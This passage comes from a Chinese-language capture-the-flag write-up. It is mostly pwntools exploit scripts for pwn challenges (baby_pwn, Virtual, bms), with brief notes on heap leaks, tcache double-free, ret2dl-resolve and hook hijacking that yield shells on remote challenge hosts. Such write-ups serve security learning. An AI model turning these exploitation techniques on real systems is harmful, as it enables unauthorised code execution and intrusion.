+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;85c3e0fcae5e972af313488de60e8a5a.kr-lab.com&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;58512&quot;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Your choice:&quot;</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> data
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;of daily:&quot;</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;daily\n&quot;</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Your choice:&quot;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;of daily:&quot;</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;daily\n&quot;</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Your choice:&quot;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;of daily:&quot;</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Your choice:&quot;</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Your choice:&quot;</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&apos;a&apos;</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&apos;b&apos;</span><span class="token punctuation">)</span><span class="token comment">#1</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&apos;c&apos;</span><span class="token punctuation">)</span><span class="token comment">#2</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&apos;d&apos;</span><span class="token punctuation">)</span><span class="token comment">#3</span>
+remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+remove<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&apos;a&apos;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&apos;a&apos;</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#2</span>
+
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;aaaaaaaa&quot;</span><span class="token punctuation">)</span>
+heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;1 :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">&apos;\0&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x220</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;aaaaaaaa&quot;</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;3 :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">&apos;\0&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c4b78</span>
+
+<span class="token keyword">print</span> <span class="token string">&quot;heap: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">&quot;libc: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
+
+remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+remove<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+remove<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+remove<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">&apos;a&apos;</span><span class="token punctuation">)</span><span class="token comment">#1</span>
+add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">&apos;a&apos;</span><span class="token punctuation">)</span><span class="token comment">#2</span>
+add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">&apos;a&apos;</span><span class="token punctuation">)</span><span class="token comment">#3</span>
+remove<span class="token punctuation">(</span><span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x18</span> <span class="token operator">-</span> ptr <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+remove<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">&apos;a&apos;</span><span class="token punctuation">)</span><span class="token comment">#1</span>
+add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">&apos;a&apos;</span><span class="token punctuation">)</span><span class="token comment">#4</span>
+edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x3c67a8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x18cd57</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x045390</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">#gdb.attach(r)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;of daily:&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="babypwn"><a name="babypwn" class="plugin-anchor" href="#babypwn"><i class="fa fa-link" aria-hidden="true"></i></a>baby_pwn</h3>
+<p><code>ret2dl in x86</code>,&#x6CA1;&#x6709;&#x53EF;&#x4F9B;<code>leak</code>&#x7684;&#x51FD;&#x6570;.&#x4FDD;&#x62A4;&#x5F88;&#x5C11;,&#x60F3;&#x8D77;&#x4E4B;&#x524D;&#x7684;<code>0ctf2018 babystack</code>,&#x4FEE;&#x6539;&#x811A;&#x672C;&#x76F4;&#x63A5;&#x6253;.  </p>
+<pre class="language-"><code class="lang-python"><span class="token keyword">import</span> sys
+<span class="token keyword">import</span> roputils
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">&apos;debug&apos;</span>
+<span class="token comment">#r = process(&quot;./pwn&quot;)</span>
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;c346dfd9093dd09cc714320ffb41ab76.kr-lab.com&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;56833&quot;</span><span class="token punctuation">)</span>
+
+rop <span class="token operator">=</span> roputils<span class="token punctuation">.</span>ROP<span class="token punctuation">(</span><span class="token string">&apos;./pwn&apos;</span><span class="token punctuation">)</span>
+addr_bss <span class="token operator">=</span> rop<span class="token punctuation">.</span>section<span class="token punctuation">(</span><span class="token string">&apos;.bss&apos;</span><span class="token punctuation">)</span>
+
+buf1 <span class="token operator">=</span> <span class="token string">&apos;A&apos;</span> <span class="token operator">*</span> <span class="token number">0x2c</span>
+buf1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x8048390</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804852D</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr_bss<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span>
+
+buf2 <span class="token operator">=</span>  rop<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token string">&apos;/bin/sh&apos;</span><span class="token punctuation">)</span>
+buf2 <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> buf2<span class="token punctuation">)</span>
+buf2 <span class="token operator">+=</span> rop<span class="token punctuation">.</span>dl_resolve_data<span class="token punctuation">(</span>addr_bss <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">&apos;system&apos;</span><span class="token punctuation">)</span>
+buf2 <span class="token operator">+=</span> rop<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> buf2<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span>
+
+buf3 <span class="token operator">=</span> <span class="token string">&apos;A&apos;</span> <span class="token operator">*</span> <span class="token number">0x2c</span> <span class="token operator">+</span> rop<span class="token punctuation">.</span>dl_resolve_call<span class="token punctuation">(</span>addr_bss <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">,</span> addr_bss<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf3<span class="token punctuation">)</span>
+
+<span class="token comment">#gdb.attach(r)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="virtual"><a name="virtual" class="plugin-anchor" href="#virtual"><i class="fa fa-link" aria-hidden="true"></i></a>Virtual</h3>
+<p>&#x7406;&#x89E3;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;.  </p>
+<p><img src="https://i.loli.net/2019/04/23/5cbde7182263f.png" alt=""></p>
+<p>&#x9996;&#x5148;&#x662F;<code>store_instruction</code>&#x51FD;&#x6570;&#x5C06;&#x8F93;&#x5165;&#x901A;&#x8FC7;&#x5206;&#x9694;&#x7B26;&#x5206;&#x7C7B;&#x4E3A;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#x7B26;&#x5E76;&#x4FDD;&#x5B58;&#x5728;&#x5806;&#x4E2D;,<code>store_num</code>&#x540C;&#x7406;.<br>&#x5176;&#x4E2D;&#x4E09;&#x4E2A;&#x5806;&#x5757;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5806;,&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x7B26;&#x5806;,&#x4E00;&#x4E2A;&#x6808;(&#x4E5F;&#x662F;&#x7528;&#x6765;&#x5B58;&#x6570;&#x636E;&#x7684;,&#x5B58;&#x50A8;&#x64CD;&#x4F5C;&#x7B26;&#x64CD;&#x4F5C;&#x7684;&#x6570;&#x636E;).</p>
+<p>&#x91CD;&#x70B9;&#x5C31;&#x662F;<code>op</code>&#x51FD;&#x6570;.</p>
+<p><img src="https://i.loli.net/2019/04/23/5cbde72e30ae4.png" alt=""></p>
+<p>&#x8FD9;&#x91CC;&#x4E0D;&#x65AD;&#x4ECE;&#x64CD;&#x4F5C;&#x7B26;&#x5806;&#x53D6;&#x51FA;&#x64CD;&#x4F5C;&#x7B26;(&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x5B57;),&#x7136;&#x540E;&#x8DF3;&#x8F6C;&#x5230;&#x51FD;&#x6570;&#x6267;&#x884C;&#x7684;&#x5730;&#x65B9;,&#x8FD9;&#x91CC;<code>IDA</code>&#x53CD;&#x6C47;&#x7F16;&#x6709;&#x95EE;&#x9898;,&#x6CA1;&#x6709;&#x8BC6;&#x522B;&#x51FA;&#x51FD;&#x6570;&#x8C03;&#x7528;,&#x5B9E;&#x9645;&#x4E0A;<code>i</code>&#x4F1A;&#x88AB;&#x8D4B;&#x503C;&#x4E3A;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x7684;&#x8FD4;&#x56DE;&#x503C;.</p>
+<p>&#x8FD9;&#x4E9B;&#x51FD;&#x6570;&#x64CD;&#x4F5C;&#x6808;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5E76;&#x5C06;&#x7ED3;&#x679C;&#x653E;&#x56DE;&#x6808;&#x4E2D;,&#x6240;&#x4EE5;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x524D;&#x9700;&#x8981;&#x5148;<code>push</code>.</p>
+<p>&#x5173;&#x952E;&#x51FD;&#x6570;&#x662F;<code>load</code>&#x548C;<code>save</code>,&#x77E5;&#x9053;&#x504F;&#x79FB;&#x5C31;&#x53EF;&#x4EE5;&#x4EFB;&#x610F;&#x8BFB;&#x5199;.<br>&#x5148;&#x4F7F;&#x7528;<code>load</code>&#x6CC4;&#x9732;&#x5806;&#x4E0A;&#x7684;&#x5806;&#x5730;&#x5740;,&#x7531;&#x4E8E;&#x6CA1;&#x5F00;<code>pie</code>,&#x901A;&#x8FC7;<code>-</code>&#x548C;<code>/</code>&#x6C42;&#x51FA;<code>.got[puts]</code>&#x548C;&#x6B64;&#x5904;&#x504F;&#x79FB;,&#x518D;&#x6B21;<code>load</code>&#x6CC4;&#x9732;<code>libc</code>,&#x5904;&#x7406;&#x4E0E;<code>system</code>&#x7684;&#x504F;&#x79FB;&#x83B7;&#x5F97;<code>system</code>&#x5730;&#x5740;.<br>&#x4E0D;&#x8FC7;&#x8FD9;&#x91CC;&#x6CA1;&#x529E;&#x6CD5;&#x590D;&#x5236;&#x4FDD;&#x5B58;&#x6570;&#x636E;,&#x53EA;&#x80FD;&#x79FB;&#x52A8;&#x548C;&#x8BA1;&#x7B97;,&#x6240;&#x4EE5;&#x4E4B;&#x524D;&#x7684;&#x504F;&#x79FB;&#x6CA1;&#x4E86;,&#x901A;&#x8FC7;&#x540C;&#x6837;&#x64CD;&#x4F5C;&#x8C03;&#x6574;&#x4E00;&#x4E0B;&#x518D;&#x6B21;&#x83B7;&#x5F97;<code>.got[puts]</code>&#x504F;&#x79FB;,&#x8C03;&#x7528;<code>save</code>&#x6210;&#x529F;&#x52AB;&#x6301;<code>puts@plt</code>.<br>&#x7A81;&#x7136;&#x53D1;&#x73B0;<code>username</code>&#x4F5C;&#x7528;,&#x5F00;&#x59CB;&#x8BD5;&#x4E86;<code>/bin/sh</code>,<code>ls</code>,<code>cat flag</code>&#x4EC0;&#x4E48;&#x7684;&#x90FD;&#x662F;<code>comment not found</code>,&#x6700;&#x540E;<code>/bin/bash</code>&#x6210;&#x529F;.</p>
+<pre class="language-"><code class="lang-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#context.log_level = &apos;debug&apos;</span>
+<span class="token comment">#r = process(&quot;./pwn&quot;)</span>
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;40003&quot;</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Your program name:\n&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Your instruction:\n&quot;</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">&quot;push push push load push sub div sub load push add&quot;</span>
+payload <span class="token operator">+=</span> <span class="token string">&quot; push push push load push sub div sub save&quot;</span>
+<span class="token comment">#payload = &quot;push push push load push sub div sub load pop&quot;</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+<span class="token comment">#gdb.attach(r)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;Your stack data:\n&quot;</span><span class="token punctuation">)</span>
+<span class="token comment">#payload = &quot;-1 8 -5 4210720&quot;</span>
+payload <span class="token operator">=</span> <span class="token string">&quot;-1 8 -5 4210720 -172800 -1 8 -6 4210720&quot;</span>
+<span class="token comment">#0x404020 = 4210720,offset = -172800,one_gadget = -173178</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+<span class="token comment">#print r.recv()</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="bms"><a name="bms" class="plugin-anchor" href="#bms"><i class="fa fa-link" aria-hidden="true"></i></a>bms</h3>
+<p>&#x8FDC;&#x7AEF;&#x73AF;&#x5883;&#x662F;<code>libc2.26</code>,&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>tcache</code>&#x653B;&#x51FB;,&#x5229;&#x7528;<code>double free</code>&#x628A;<code>chunk</code>&#x5206;&#x914D;&#x5728;<code>stdout</code>&#x9644;&#x8FD1;,&#x4F7F;<code>tcache bin</code>&#x6307;&#x5411;<code>_IO_2_1_stdout_</code>.</p>
+<p>&#x4FEE;&#x6539;&#x7ED3;&#x6784;&#x4F53;&#x6CC4;&#x9732;<code>libc</code>,&#x518D;&#x6B21;&#x4F7F;&#x7528;<code>tcache</code>&#x653B;&#x51FB;&#x5206;&#x914D;<code>chunk</code>&#x5230;<code>__free_hook</code>,&#x52AB;&#x6301;&#x4E3A;<code>one_gadget</code>,&#x8C03;&#x7528;<code>free</code>&#x83B7;&#x5F97;<code>shell</code>.</p>
+<p><img src="https://i.loli.net/2019/04/23/5cbde7238db45.png" alt=""></p>
+<pre class="language-"><code class="lang-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">&apos;debug&apos;</span>
+<span class="token comment">#r = process(&quot;./pwn&quot;)</span>
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;39.106.224.151&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;60002&quot;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> length<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;book name:&quot;</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;description size:&quot;</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;description:&quot;</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;&gt;\n&quot;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">remove</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;index:&quot;</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;&gt;\n&quot;</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;username:&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&quot;admin\n\x00&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;password:&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&quot;frame\n\x00&quot;</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;&gt;\n&quot;</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span><span class="token punctuation">)</span><span class="token comment">#0</span>
+remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x602020</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#1</span>
+add<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x602020</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#2</span>
+add<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> p8<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#3</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;book name:&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;description size:&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;description:&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad2887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x601F70</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#4</span>
+
